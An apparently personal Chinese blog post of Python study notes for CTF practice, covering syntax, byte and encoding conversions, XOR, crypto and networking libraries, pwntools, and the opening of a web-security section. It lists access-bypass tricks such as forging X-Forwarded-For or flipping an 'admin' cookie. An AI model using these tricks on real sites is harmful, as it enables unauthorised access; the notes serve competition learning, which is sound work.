---
title: python学习日志，应该还不算太晚
published: 2026-09-14
description: '想就业但是什么都不会所以先学着'
image: ''
tags: [python, 笔记]
category: 'python'
draft: false 
lang: ''
---

# 环境
```bash
python3 --version        # 确认有 Python 3
pip3 install pycryptodome requests pwntools   # CTF 三件套
```

---

# 第一部分：核心语法速览（语法基础 + 类 + 调试）
## 1.1 变量：贴标签，不用声明类型

Python 的变量就像**给东西贴标签**——盒子（数据）本来就在那，你只是贴个名字上去。

```python
x = 42          # 整数
y = 3.14        # 浮点数
s = "hello"     # 字符串
flag = True     # 布尔值（True / False，首字母大写！）
nothing = None  # 表示"什么都没有"

x = "现在装字符串了"   # 同一个标签可以撕下来贴到别的东西上（动态类型）
```

三种注释写法（写 exp 时给"未来的自己"留线索）：

```python
# 井号：单行注释，最常用

"""
三引号字符串放这里不上不下时，
就当成多行注释用（本质是一个没人接收的字符串）
"""

x = 42  # 行尾注释：解释这一行干嘛
```

不知道变量是什么类型？问它：

```python
type(42)        # <class 'int'>
type("flag")    # <class 'str'>
type(b"flag")   # <class 'bytes'>     ← 注意它和 str 不是一回事！
type([1, 2])    # <class 'list'>
```

CTF 常用进制写法：

```python
a = 0xff        # 十六进制 255
b = 0b1010      # 二进制 10
c = 0o17        # 八进制 15
print(a, b, c)  # 255 10 15
```

### 运算符速查

算术运算符：

| 运算符 | 含义 | 例子 | 结果 |
|--------|------|------|------|
| `+` `-` `*` | 加减乘 | `3 * 4` | `12` |
| `/` | **除（永远得浮点数！）** | `5 / 2` | `2.5` |
| `//` | 整除（向下取整） | `5 // 2` | `2` |
| `%` | 取余 | `5 % 2` | `1` |
| `**` | 幂 | `2 ** 10` | `1024` |

比较与逻辑运算符：

| 运算符 | 含义 | 备注 |
|--------|------|------|
| `==` `!=` | 相等 / 不等 | 别把 `==` 写成 `=`（赋值），经典 bug |
| `<` `>` `<=` `>=` | 大小比较 | 数字、字符串都能比（按字典序） |
| `and` `or` `not` | 与 / 或 / 非 | 是英文单词，不是 `&&` `||` |
| `in` | 包含判断 | `"flag" in text`，CTF 高频 |

`^`是**按位异或**运算符，用在`XOR`里
按二进制每一位对比：
> 两位**不同为 1，相同为 0**

- `0 ^ 0 = 0`
- `0 ^ 1 = 1`
- `1 ^ 0 = 1`
- `1 ^ 1 = 0`

| 运算符 | 名称     |
| ------ | -------- |
| &      | 按位与   |
| \|     | 按位或   |
| ^      | 按位异或 |
| ~      | 按位取反 |
| <<     | 左移     |
| >>     | 右移     |

```python
# 链式比较是合法的，读起来像数学
0 <= 5 < 10        # True

# Python 的 and/or 有"短路"特性，还返回操作数本身（不只是 True/False）
0 or "默认值"      # '默认值'（0 是假值，于是取右边）
"存在" and 42      # 42（左边为真，于是取右边）
```

> 经典坑：`1 or 2 and 3` 的结果是 `1`（and 优先级高于 or）。拿不准就加括号。

## 1.2 输入输出与转义：跟程序对话

### print：不止能打印一个东西

```python
print("a", "b", "c")          # a b c     默认用空格分隔
print("a", "b", sep="-")      # a-b       自己指定分隔符
print("不带换行", end="")      # end 参数控制结尾（默认换行 \n）
print(f"{42:08d}")            # 00000042  配合 f-string 格式化
```

### input：从键盘读输入（注意：永远返回字符串！）

```python
name = input("你的ID: ")       # 界面提示语，输入完按回车
age = input("年龄: ")
age + 1                        # ❌ 报错！input 给的是 str
int(age) + 1                   # ✅ 先转成数字

# 脚本化实战提示：CTF exp 基本用不上 input（都是自动跑的），
# 但写交互式小工具时很好用。sys.argv 能拿命令行参数：
import sys
# 运行 python3 tool.py hello → sys.argv = ['tool.py', 'hello']
print(sys.argv[1] if len(sys.argv) > 1 else "没给参数")
```

### 转义字符：反斜杠的魔法

```python
"\n"      # 换行
"\t"      # 制表符（对齐输出神器）
"\\"      # 反斜杠本身（Windows 路径的痛）
"\""      # 双引号本身（字符串里想放双引号）
r"C:\new\test"   # r 前缀 = 原始字符串，反斜杠不再转义（正则表达式的好朋友）
b"\x41"   # b 前缀 = bytes 字面量，\x41 就是字节 0x41，即 'A'

print("C:\\new\\test")   # C:\new\test
print(r"C:\new\test")    # C:\new\test（r 前缀更省事）
```
`r` / `R` 代表 **raw 原始字符串**，作用：**关闭转义字符，反斜杠 `\` 不再做转义，就是普通的反斜杠字符**。

> CTF 提醒：写正则时**永远用 r"" 前缀**，否则 `\d` 会先被字符串转义吃掉，正则就废了。

## 1.3 字符串（CTF 的绝对核心，重点掌握）

### 拼接与重复

```python
s = "flag" + "{" + "test" + "}"   # 拼接
bar = "-" * 20                     # 重复：'--------------------'
```

### f-string 格式化

```python
name = "moectf"
score = 99
print(f"比赛 {name}，得分 {score}")        # 变量直接塞进花括号
print(f"十六进制：{255:x}")                # ff
print(f"十六进制补零：{255:#010x}")        # 0x000000ff
print(f"补零到8位：{42:08d}")              # 00000042
```

花括号里的 `:` 后面是**格式化指令**，CTF 里经常用来把数字转成固定位数的十六进制。

### 切片（slicing）—— 从字符串里"切一段"

这是 Python 最爽的功能之一，规则：**`s[起点:终点]`，包含起点、不包含终点**。

```python
s = "moectf{th1s_1s_a_flag}"

s[0]        # 'm'           第 0 个字符（从 0 开始数！）
s[7:21]     # 'th1s_1s_a_flag'  第 7 到第 20 个
s[7:-1]     # 'th1s_1s_a_flag'  -1 表示倒数第 1 个（即最后的 '}' 不取）
s[:6]       # 'moectf'       从头切到第 5 个
s[-1]       # '}'            最后一个字符
s[::2]      # 'met{hs1__lg'  每隔 2 个取一个（步长）
s[::-1]     # '}galf_a_s1_s1ht{ftceom'  整个字符串反转！CTF 老朋友
```

### 常用字符串方法

```python
s = "  Hello World  "

s.strip()           # 去掉两端空白
s.split()           # 按空白切 -> ['Hello', 'World']
"a,b,c".split(",")  # 按逗号切 -> ['a', 'b', 'c']
s.replace("l", "1") # 替换
s.upper() / s.lower()
s.startswith("  He") # True，判断前缀
"flag" in s          # False，判断子串是否出现
"abc123".isdigit()   # False（因为有字母）
s.find("World")      # 返回下标，找不到返回 -1
"-".join(["a","b","c"])  # 用 - 把列表粘起来 -> 'a-b-c'
```

## 1.4 列表、元组、字典、集合

| 类型 | 写法 | 特点 | 类比 |
|------|------|------|------|
| 列表 list | `[1, 2, 3]` | 可增删改，**有序** | 一排格子，随便换 |
| 元组 tuple | `(1, 2, 3)` | 不可修改，有序 | 封死的格子 |
| 字典 dict | `{"a": 1}` | 键值对，按 key 取 | 电话簿（名字→号码） |
| 集合 set | `{1, 2, 3}` | 自动去重，无序 | 一堆不重复的球 |

```python
# 列表：CTF 里存爆破候选、解码结果全靠它
lst = [3, 1, 4, 1, 5]
lst.append(9)          # 尾部添加
lst[0]                 # 3（下标也是从 0 开始，也支持切片）
lst.sort()             # 原地排序 -> [1, 1, 3, 4, 5, 9]，感觉python好贱啊一个词就搞定了c一个函数的事情
sorted(lst, reverse=True)  # 返回新的降序列表（从大到小)，False反之
len(lst)               # 长度 6
lst.index(4)           # 元素 4 的下标

# 字典：CTF 里做映射（凯撒密码表、字符频率统计）
d = {"A": 1, "B": 2}
d["C"] = 3             # 添加
"A" in d               # True，判断 key 存在
d.get("Z", 0)          # 取值，不存在就返回默认值 0（不报错！）
d.items()              # [('A', 1), ('B', 2), ('C', 3)]，遍历用
for k, v in d.items():
    print(k, v) #常见用法
d.keys()                # 拿到所有键
d.values()              # 拿到所有值
# 集合：一句话去重
set([1, 1, 2, 2, 3])   # {1, 2, 3}

# 元组：函数返回多个值时常见
x, y = (3, 4)          # 解包：x=3, y=4
```

### 列表推导式：一行顶四行

"对每个元素做同一件事"的循环，可以压成一行，**读题解/writeup 时到处都是它**：

```python
# 普通写法：
result = []
for ch in "abc":
    result.append(ord(ch))

# 等价的推导式写法：
result = [ord(ch) for ch in "abc"]           # [97, 98, 99]
#result要为空列表，不然要用result.extend([ord(ch) for ch in s])
# 带条件过滤：只要数字字符
[ch for ch in "a1b2c3" if ch.isdigit()]      # ['1', '2', '3']，.isdigit判断字符串全部字符是不是数字字符

# 带转换：全部大写
[ch.upper() for ch in "abc"]                 # ['A', 'B', 'C']

# CTF 实战：把 hex 字符串两两分组（处理密文块）
hexstr = "deadbeef"
[hexstr[i:i+2] for i in range(0, len(hexstr), 2)]
# -> ['de', 'ad', 'be', 'ef']

# CTF 实战：字符频率统计（古典密码分析）
from collections import Counter
Counter(ch for ch in "aabbccdde")            # Counter({'a': 2, 'b': 2, ...})
```

> 读法：`[表达式 for 变量 in 序列 if 条件]` —— "对序列里每个（满足条件的）变量，算出表达式"。
> 字典和集合也有推导式：`{k: v for ...}` 和 `{x for ...}`，语法同理。

> 读法：`[表达式 for 变量 in 序列 if 条件]` —— "对序列里每个（满足条件的）变量，算出表达式"。
> 字典和集合也有推导式：`{k: v for ...}` 和 `{x for ...}`，语法同理。

## 1.5 控制流：if / for / while

**重点：Python 用缩进表示代码块**（通常 4 个空格），没有大括号。缩进错了直接报错。

```python
# if
score = 85
if score >= 90:
    print("优")
elif score >= 60:      # 是 elif，不是 else if
    print("及格")
else:
    print("挂了")
```

```python
# for：遍历序列
for ch in "abc":           # 直接遍历字符串
    print(ch)

for i in range(5):         # range(5) = 0,1,2,3,4
    print(i)

for i in range(2, 10, 3):  # 从 2 到 9，步长 3 -> 2, 5, 8
    print(i)

# 遍历列表同时拿下标（CTF 常用）
for i, ch in enumerate("abc"):
    print(i, ch)           # 0 a / 1 b / 2 c

# 同时遍历两个序列
for k, v in zip("abc", [1, 2, 3]):
    print(k, v)            # a 1 / b 2 / c 3
```

```python
# while：不知道循环几次时用（比如爆破直到成功）
key = 0
while True:
    if key * 7 == 42:
        print(f"找到了 key = {key}")
        break              # break 跳出循环
    key += 1
```

## 1.6 函数

```python
def decrypt(cipher, shift):
    """文档字符串：简单说明这个函数干嘛的"""
    result = ""
    for ch in cipher:
        result += chr(ord(ch) - shift)
    return result          # 不写 return 就返回 None

print(decrypt("tvqfs", 1))  # 'super'

# 默认参数
def greet(name, greeting="hello"):
    return f"{greeting}, {name}"

print(greet("liyuhang"))               # hello, liyuhang
print(greet("liyuhang", "yo"))         # yo, liyuhang
```

一句话小函数（lambda），通常配合 `sorted` 用：

```python
pairs = [("b", 2), ("a", 9), ("c", 1)]
sorted(pairs, key=lambda p: p[1])   # 按每个元组的第 2 个元素排序
# -> [('c', 1), ('b', 2), ('a', 9)]
```

### 函数进阶三点（看懂别人的代码就够用）

```python
# ① *args / **kwargs：接收任意数量的参数
#    *args 把多余的"普通参数"收成元组，**kwargs 把"关键字参数"收成字典
def flex(*args, **kwargs):
    print(args, kwargs)

flex(1, 2, mode="fast")             # (1, 2) {'mode': 'fast'}

# 反向操作：把列表/字典"摊开"成参数（pwntools 源码里常见）
def add(a, b):
    return a + b
add(*[1, 2])                        # 3，等价于 add(1, 2)

# ② 可变默认参数大坑：默认值是列表/字典时，所有调用共享同一份！
def bad(item, bucket=[]):           # ❌ 危险写法
    bucket.append(item)
    return bucket
bad(1); bad(2)                      # [1, 2] —— 上一调用的残留还在！

def good(item, bucket=None):        # ✅ 正确姿势
    if bucket is None:
        bucket = []
    bucket.append(item)
    return bucket

# ③ if __name__ == "__main__": 是干嘛的？
#    被 python3 直接运行的文件，__name__ 等于 "__main__"；
#    被别的文件 import 时，__name__ 是模块名（不等于 "__main__"）。
#    所以这个 if 的意思是："只有直接运行我时才执行下面的代码，被导入时不执行"。
#    examples/ 里每个脚本末尾都有它，现在你知道为什么了。
```

## 1.7 异常处理：让脚本别一崩就死

CTF 脚本经常要"试错"（比如爆破时跳过解码失败的候选），靠的就是 try/except：

```python
import base64

data = "不是base64的内容!!!"
try:
    result = base64.b64decode(data)
except Exception as e:
    print(f"解码失败：{e}")     # 捕获所有异常，爆破脚本的好朋友
```

## 1.8 导入库的几种写法

```python
import os                    # 用的时候写 os.system(...)
import base64                # base64.b64decode(...)
from Crypto.Cipher import AES    # 直接拿 AES 来用（pycryptodome）
from pwn import *            # pwn 题：全部倒入，省事（写 exp 惯例）
```


## 1.9 类与面向对象：图纸和实例

**类比：类 = 图纸，实例（对象） = 按图纸造出来的产品。** 图纸只有一份，产品可以造无数台；一台产品坏了不影响图纸和其他产品。

```python
class Challenge:                     # 类名习惯用大驼峰（每个单词首字母大写）
    """一道 CTF 题目"""

    def __init__(self, name, port, solved=False):
        """构造方法：造实例时自动调用。
        self = 这个实例自己，永远是第一个参数，写法固定"""
        self.name = name             # 实例变量：每个实例自己的一份
        self.port = port
        self.solved = solved

    def connect(self):               # 实例方法：第一个参数永远是 self
        return f"连接 {self.name}:{self.port} 成功"

    def solve(self):
        self.solved = True           # 方法里改自己的状态
        return f"{self.name} 已拿下！"


# 按图纸造两台"产品"：
web = Challenge("web签到", 80)        # 不用传 self！Python 自动把 web 塞进去
rev = Challenge("rev基础", 9999)

print(web.name)                      # web签到（各自的属性互不干扰）
print(rev.connect())                 # 连接 rev基础:9999 成功
print(web.solved)                    # False（rev 动 web 不动）
web.solve()
print(web.solved)                    # True
```

读代码时记住三板斧，90% 的类都能看懂：

1. `__init__` 里的 `self.xxx = ...` → 这个类**有哪些属性**（数据）
2. 普通 `def` 方法 → 这个类**能干什么**（行为）
3. `变量.方法()` / `变量.属性` → 就是"让这个实例干活/看它的数据"

### 常见的"双下划线"魔法方法

名字以 `__xxx__` 包住的方法有特殊含义，Python 在特定时机**自动**调用它们：

```python
class Flag:
    def __init__(self, content):
        self.content = content

    def __str__(self):               # print(实例) 时自动调用，只带self，必须要有return
        return f"Flag({self.content[:8]}...)"

    def __len__(self):               # len(实例) 时自动调用
        return len(self.content)

    def __eq__(self, other):         # 实例 == 实例 时自动调用
        return self.content == other.content


f = Flag("flag{cl4ss_1s_e4sy}")
print(f)                             # Flag(flag{cl4...)，走的 __str__
len(f)                              # 19，走的 __len__
f == Flag("flag{cl4ss_1s_e4sy}")    # True，走的 __eq__
```

> `"a" + "b"` 走的 `__add__`、`"abc"[0]` 走的 `__getitem__`。

### 继承：站在爹的肩膀上

```python
class DecodeError(Exception):        # 继承内置的 Exception 类
    """自定义异常：让报错信息带上下文"""
    pass                             # 什么都不加，白捡爹的全部能力


try:
    raise DecodeError("base64 解到一半断了")   # raise = 主动抛出异常
except DecodeError as e:
    print(f"处理自定义异常: {e}")
```

继承的语法就是 `class 子类(父类):`。子类自动拥有父类的一切，还能**覆写**（重定义同名方法）来改行为：

```python
class Animal:
    def __init__(self, name):
        self.name = name
    def speak(self):
        return "..."

class Cat(Animal):                   # Cat 继承 Animal
    def speak(self):                 # 覆写父类方法
        return "喵"
    def purr(self):                  # 子类新增技能
        return "呼噜"

c = Cat("咪")
print(c.name)                        # 咪（白捡的，来自父类 __init__）
print(c.speak())                     # 喵（覆写生效）

# 子类想"先干爹的事，再干自己的事"：用 super()
class LoudCat(Cat):
    def speak(self):
        return super().speak().upper() + "!!"
```

> Rev/PPC 题源码里 `class LoginHandler(BaseHandler)` 这种一长串继承链，就是"功能一层层叠加"——从最底层父类开始读，是最快的破题路径。

### dataclass：不想手写 __init__ 时的偷懒神器

存数据的类（config、题目信息、结构体字段），用 `@dataclass` 装饰器一行搞定：

```python
from dataclasses import dataclass

@dataclass
class Task:
    name: str                        # 直接声明字段：名字: 类型
    port: int
    solved: bool = False             # 有默认值的排后面


t = Task("web签到", 80)
print(t)                             # Task(name='web签到', port=80, solved=False)
# __init__、__repr__、__eq__ 全部自动生成，白嫖
```

> 类型标注（`name: str`）只是"给人和工具看的提示"，Python 运行时**不强制检查**——但读代码时非常好用，pwntools/pycryptodome 的文档里全是它。

### CTF 里你会在哪撞见类

| 场景 | 长什么样 | 你要做什么 |
|------|----------|------------|
| 题目源码 | `class Challenge: ...` 然后末尾 `if __name__ == "__main__"` 实例化运行 | 读 `__init__` 拿属性，读方法理逻辑 |
| 异常处理 | `except ValueError:` / 自定义异常 | 知道 `ValueError` 是个类，`raise` 是造实例 |
| pwntools | `io = remote(...)` 后 `io.sendline(...)` | `io` 是 remote 类的实例，方法是它爹们给的 |
| requests | `s = requests.Session()` | Session 类帮你自动管 Cookie |
| 写自己的工具 | exp 越写越长 | 把"连接、发包、解析"各写成一个类，主流程瞬间清爽 |

## 1.10 调试技巧：脚本跑不通时的三板斧

### 第一斧：print 大法（永远的神）

```python
# f-string 的调试语法 {x=}：自动打印"变量名=值"，连名字都不用自己写
key = 0x42
print(f"{key=}")                    # key=66
print(f"{key=:#x}")                 # key=0x42（= 后面直接跟 : 格式化）

# 打印 bytes 时用 !r，看得见 \x 转义，分清 b'4' 和 0x34
data = b"\xde\xad"
print(f"{data}")                    # 广 �（乱码，没用）
print(f"{data!r}")                  # b'\xde\xad'（要的就是这个）
```

### 第二斧：assert 自检（"我认为这里必然成立"）

```python
plain = xor_single(cipher, key)
assert b"flag{" in plain, f"解出来的不对劲: {plain!r}"   # 不成立就炸并带信息
# 条件为假时抛 AssertionError —— 把"我以为"变成"机器替我盯着"
```

### 第三斧：breakpoint() 单步调试（想看每一步时）

在想停下来的地方插一行 `breakpoint()`，运行后进入交互式调试器 pdb：

```python
result = decrypt(data, 17)
breakpoint()                        # 脚本停在这，进入 pdb 提示符 (Pdb)
print(result)
```

| pdb 命令 | 作用 | | pdb 命令 | 作用 |
|----------|------|-|----------|------|
| `n` | 执行下一行 | | `p 变量` | 打印变量值 |
| `s` | 进入函数内部 | | `pp 变量` | 漂亮打印（大字典） |
| `c` | 继续跑到底 | | `q` | 退出 |
| `l` | 显示当前位置代码 | | `w` | 我是怎么到这的（调用栈） |

### 读懂报错：Traceback 从下往上读

```
Traceback (most recent call last):      ← 有错误了
  File "exp.py", line 10, in <module>   ← 错误发生在 exp.py 第 10 行
    n = int(data)                        ← 出错的那行代码
ValueError: invalid literal for int()   ← 错误类型 + 原因（最重要的一行！）
```

常见报错一眼翻译：

| 报错 | 人话 |
|------|------|
| `TypeError: a bytes-like object is required` | str 和 bytes 混用了 → encode/decode |
| `IndexError: list index out of range` | 下标越界（差一错误高发区） |
| `KeyError: 'xxx'` | 字典里没这个 key → 用 .get() 兜底 |
| `AttributeError: 'str' object has no attribute 'encode'` | 类型搞错了：对 str 调 encode 前先看它是不是已经 decode 过 |
| `IndentationError` | 缩进乱了（tab 空格混用高发区） |
| `ModuleNotFoundError` | 库没装 / 名字拼错 |

---

# 第二部分：CTF 神器 —— 字节、进制与编码转换

Crypto/Rev/Web 题一半时间都在跟字节打交道。

## 2.1 先搞懂 str 和 bytes 的区别

- `str`：人类看的字符串，`"flag{...}"`
- `bytes`：计算机存的原始字节，`b"flag{...}"`（注意前面的 `b`）

```python
s = "flag"
b = s.encode()          # str -> bytes（默认 utf-8）
s2 = b.decode()         # bytes -> str
```

**黄金法则：加密/解密前先 `.encode()` 成 bytes，解完再 `.decode()` 回 str。** 报 `TypeError: a bytes-like object is required` 基本都是忘了这一步。

## 2.2 字节 ⇄ 数字（Crypto 题每道都用）

```python
b = b"\x00\xff"
n = int.from_bytes(b, "big")     # 255，"big" 是大端（高位在前），int.from_bytes(b, byteorder)
n = int.from_bytes(b, "little")  # 65280，小端

n = 255
b = n.to_bytes(2, "big")         # b'\x00\xff'，指定占 2 个字节
b = n.to_bytes(1, "big")         # b'\xff'，占 1 个字节

# 大数字转 bytes，不想算长度？直接用 (n.bit_length()+7)//8，向上取整
n = 123456789
b = n.to_bytes((n.bit_length() + 7) // 8, "big")
```

单个字符 ⇄ 编码数字：

```python
ord("A")    # 65：字符 -> 数字
chr(65)     # 'A'：数字 -> 字符

b = b"ABC"
b[0]        # 65！！注意：bytes 取下标得到的是 int，不是 b'A'
bytes([65, 66, 67])   # b'ABC'：数字列表 -> bytes
```

## 2.3 十六进制（hex）转换

```python
b = b"\xde\xad\xbe\xef"

b.hex()              # 'deadbeef'        bytes -> hex 字符串
bytes.fromhex("deadbeef")   # b'\xde\xad\xbe\xef'  hex 字符串 -> bytes

n = 3735928559
hex(n)               # '0xdeadbeef'      数字 -> 0x 开头字符串
int("deadbeef", 16)  # 3735928559        任意进制字符串 -> 数字
int("0xdeadbeef", 16)  # 也认 0x 前缀

# 每个字节转成两位 hex 字符串的列表（CTF 分析数据块常用）
[format(x, "02x") for x in b]   # ['de', 'ad', 'be', 'ef']
```

## 2.4 base64 / base32 / base16 / base85

```python
import base64

s = "flag{base64_is_easy}"
enc = base64.b64encode(s.encode())      # 注意：输入必须是 bytes！
# b'ZmxhZ3tiYXNlNjRfaXNfZWFzeX0='
dec = base64.b64decode(enc)             # b'flag{base64_is_easy}'
dec.decode()                            # 变回 str

base64.b32encode(b"data")    # base32：字符集 A-Z2-7
base64.b16encode(b"data")    # base16：就是 hex 大写
base64.b85encode(b"data")    # base85：更少见，见到能认出来就行

# URL-safe 变体（把 + / 换成 - _）
base64.urlsafe_b64encode(b"a?b/c")
```

> 经验：题目给一串 `A-Za-z0-9+/=` 结尾带 `=` 的，先无脑 b64decode 试试；全是大写字母和数字 2-7 的，试试 base32。

## 2.5 异或 XOR（Rev/Crypto 出场率之王）

Python 里没有现成的 xor 函数，**这两行自己写**，几乎每道 xor 题都靠它：

```python
def xor(data: bytes, key) -> bytes:
    """key 可以是单个 int、bytes 或 str"""
    if isinstance(key, str):#isinstance(对象, 类型)判断一个对象是不是属于某个（或某些）数据类型，返回 True/False
        key = key.encode()
    if isinstance(key, int):
        return bytes([b ^ key for b in data])       # 单字节 key
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])  # 循环 key
```

配套的两个技巧：

```python
# 用法示例
xor(b"\x10\x20\x30", 0x42)     # 单字节 key
xor(b"secret", b"key")         # 循环 bytes key

# 已知明文片段
c = bytes.fromhex("242e232539")           # 某密文开头
key = c[0] ^ ord('f')                     # 已知明文以 'f' 开头
print(f"key = {key:#x}")                  # 0x42
```

### 2.6 文件读写（题目附件处理必备）

```python
# 读文本
with open("chall.py", "r", encoding="utf-8") as f:
    text = f.read()

# 读二进制（附件、dump 出来的数据）—— 必须加 "rb"！
with open("cipher.bin", "rb") as f:
    data = f.read()        # 得到 bytes

# 按行读
with open("log.txt") as f:
    for line in f:
        line = line.strip()     # 每行去掉换行符

# 写文件
with open("result.txt", "w") as f:
    f.write("解题成功\n")

with open("out.bin", "wb") as f:    # 二进制写
    f.write(b"\xde\xad\xbe\xef")

# 一次性列目录、执行命令
import os
os.listdir(".")                   # 当前目录文件列表
os.path.getsize("cipher.bin")     # 文件大小（字节）

import subprocess
out = subprocess.run(["ls", "-la"], capture_output=True, text=True)
print(out.stdout)
```

> `with open(...) as f` 的好处：用完自动关文件，不会忘记 close。就用这个写法。

---

# 第三部分：常用标准库速查表

| 库 | 用途 | 高频函数 |
|----|------|----------|
| `base64` | 编码转换 | `b64encode / b64decode / b32decode` |
| `binascii` | 进制工具 | `hexlify / unhexlify`（等价于 `.hex()` / `fromhex`） |
| `hashlib` | 哈希 | `md5 / sha256 / sha1` |
| `itertools` | 组合枚举 | `product`（爆破字符组合神器） |
| `string` | 字符常量 | `ascii_letters / digits / printable` |
| `re` | 正则 | `findall / search / sub` |
| `struct` | 二进制打包 | `pack / unpack`（协议题对齐字段） |
| `zlib` | 压缩流 | `decompress`（伪加密 zip / 流数据） |
| `random` | 随机 | 注意：**不是密码学安全的**，题目用 random 出的"随机数"可以预测 |
| `os` / `sys` | 系统交互 | `os.listdir`、`sys.argv`（命令行参数） |

几个值得展开的：

```python
# hashlib：一眼验 MD5
import hashlib
hashlib.md5(b"admin").hexdigest()      # '21232f297a57a5a743894a0e4a801fc3'
hashlib.sha256(b"xxx").hexdigest()

# string + itertools：爆破神组合
import string, itertools
for pwd in itertools.product(string.digits, repeat=4):
    print("".join(pwd))     # 0000 0001 ... 9999 全部 4 位数字

# re：从一堆文本里抠 flag
import re
text = "垃圾数据 flag{he11o} 更多垃圾"
re.findall(r"flag\{[^}]*\}", text)    # ['flag{he11o}']
```

> 正则速记：`\d` 数字，`\w` 字母数字下划线，`.` 任意字符，`*` 0+ 次，`+` 1+ 次，`[^}]` 非 `}` 的任意字符。

---

# 第四部分：三大 CTF 第三方库实战

## 4.1 pycryptodome（Crypto 题主力）

```bash
pip3 install pycryptodome
```

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Util.number import long_to_bytes, bytes_to_long
import os

# ---- RSA/大数题最常用的两个工具 ----
long_to_bytes(0x68656c6c6f)    # b'hello'（自动算长度，比 to_bytes 省心）
bytes_to_long(b"hello")        # 0x68656c6c6f

# ---- AES-ECB（最简单的模式，先会它）----
key = b"0123456789abcdef"          # 必须 16/24/32 字节
cipher = AES.new(key, AES.MODE_ECB)
ct = cipher.encrypt(pad(b"secret message", 16))    # 明文必须凑够 16 的倍数
cipher2 = AES.new(key, AES.MODE_ECB)
pt = unpad(cipher2.decrypt(ct), 16)               # b'secret message'

# ---- AES-CBC（多一个 16 字节 IV）----
iv = os.urandom(16)
cipher = AES.new(key, AES.MODE_CBC, iv=iv)

# ---- AES-CTR（流式，不需要 pad）----
from Crypto.Util import Counter
ctr = Counter.new(128, initial_value=0)     # 128 位计数器
cipher = AES.new(key, AES.MODE_CTR, counter=ctr)

# ---- AES-GCM（带认证标签 tag）----
cipher = AES.new(key, AES.MODE_GCM, nonce=b"\x00" * 8)
ct, tag = cipher.encrypt_and_digest(b"top secret")
# 解密时用 decrypt_and_verify，tag 不对会抛异常
```

> pycryptodome 的文档习惯：`Cipher` 对象用一次就换新的（特别是 GCM/CTR），复用同一个对象继续 encrypt 会得到错误结果——这是新手最常踩的坑之一。

## 4.2 requests（Web 题脚本化）

1. **params**：GET 查询参数，字典，自动拼在 url 后面
```python
r = requests.get("http://httpbin.org/get", params={"name":"test","page":1})
# url自动变成 http://httpbin.org/get?name=test&page=1
```

2. **data**：POST 表单提交 `application/x-www-form-urlencoded`
```python
r = requests.post("http://httpbin.org/post", data={"user":"admin"})
```

3. **json**：POST 发送 json，自动设置`Content-Type:application/json`
```python
r = requests.post("http://httpbin.org/post", data={"user":"admin"})
```
data = 表单；json=json 数据

4. **headers** 请求头（字典，最常用 User-Agent）
```python
headers = {"User-Agent":"Mozilla/5.0"}
r = requests.get(url, headers=headers)
```

5. **cookies** 携带 cookie 字典
```python
cookies = {"sessionid":"abc123"}
r = requests.get(url, cookies=cookies)
```

6. **timeout** 超时（**一定要加！防止卡死**）
```python
r = requests.get(url, timeout=5) #5秒没响应直接抛异常
# (连接超时,读取超时) 元组写法 timeout=(3,5)
```

7. **verify=False** 关闭 HTTPS 证书校验
```python
r = requests.get("https://xxx", verify=False)
```

```python
import requests

# GET
r = requests.get("https://httpbin.org/get", params={"q": "flag"},
                 timeout=10)
print(r.status_code)      # 200
print(r.text)             # 响应正文
print(r.json())           # 响应是 JSON 时直接转字典

# POST（表单）
r = requests.post("https://httpbin.org/post",
                  data={"username": "admin", "password": "123456"})

# POST JSON（API 类题目）
r = requests.post("https://httpbin.org/post", json={"cmd": "ls"})

# 带请求头 / Cookie（伪造 UA、带 session 常用）
r = requests.get("https://httpbin.org/headers",
                 headers={"User-Agent": "Mozilla/5.0"},
                 cookies={"session": "abc123"})

# Session：自动保持 Cookie（登录后的会话复用）
s = requests.Session()
s.post("http://example.com/login", data={"user": "a", "pass": "b"})
s.get("http://example.com/flag")     # 自动带上登录 cookie
```

### 4.3 pwntools（Pwn/Rev 远程交互神器）

```bash
pip3 install pwntools
```

```python
from pwn import *

context.log_level = "info"       # 调试时改 "debug" 能看到所有收发

# 连本地程序（Rev 题本地跑逻辑）或远程（比赛交 flag 用远程）
io = process("./chall")          # 本地
io = remote("ctf.example.com", 9999)   # 远程：注意是 IP/域名 + 端口

io.sendline(b"1")                # 发送一行（自动加 \n）
io.send(b"raw data")             # 原样发送
io.recvline()                    # 收一行
io.recvuntil(b"choice: ")        # 收到指定字符串为止（最常用！）
io.recv(1024)                    # 最多收 1024 字节
io.recvall(timeout=2)            # 收到对方关闭为止
io.interactive()                 # 交还终端给你手撸（拿到 shell 后必用）

# 打包数值成字节（构造 payload 必备）
p32(0xdeadbeef)      # b'\xef\xbe\xad\xde'  32 位小端
p64(0xdeadbeef)      # 64 位小端
u32(b"\xef\xbe\xad\xde")   # 反向解包

# 打日志，确认脚本跑到哪了
log.info("第 %d 轮爆破", i)
success("拿到 flag！")
```

> 典型交互节奏：`recvuntil` 等提示符 → `sendline` 发答案 → 循环 → 最后 `interactive()`。

### 4.4 socket（pwntools 没装时的备胎，也是理解原理的好材料）

```python
import socket

s = socket.create_connection(("ctf.example.com", 9999), timeout=10)
s.sendall(b"hello\n")
data = s.recv(4096)
print(data.decode(errors="replace"))
s.close()
```

---

# 第五部分：Web 安全方向 —— 用 Python 打 Web 题

> Web 题本质一句话：**服务器把你的输入拼进了 SQL、命令、页面或文件路径，而你让它干了不该干的事**。
> 这一部分讲两件事：看懂 HTTP，以及用 requests 把"手工测试"变成"自动化脚本"。

## 5.0 先懂 HTTP：Web 题的通用语言

一次登录请求，在 Burp / 浏览器 F12 里长这样：

```http
POST /login.php HTTP/1.1         ← 请求行：方法 + 路径 + 协议
Host: ctf.example.com
User-Agent: Mozilla/5.0          ← 身份标识（CTF 常考"伪造它"）
Cookie: PHPSESSID=abc123         ← 会话凭证：服务器凭它认你
Content-Type: application/x-www-form-urlencoded   ← 请求体的格式
                                 ← 空行分隔头和体
username=admin&password=123456   ← 请求体（GET 一般没有）
```

CTF 高频请求头（按出现率排序）：

| 头 | 作用 | 经典考法 |
|----|------|----------|
| `Cookie` | 会话凭证 | 把 `admin=0` 改成 `admin=1` 直接越权 |
| `User-Agent` | 浏览器标识 | "仅限内部设备访问" → 伪造 UA |
| `X-Forwarded-For` | 来源 IP | "只允许 127.0.0.1 访问" → 伪造 XFF |
| `Referer` | 来源页面 | "必须从管理页跳过来" → 伪造 |
| `Content-Type` | body 格式 | 表单 / JSON / 文件上传（multipart） |

状态码速查：

| 码 | 含义 | 解题嗅觉 |
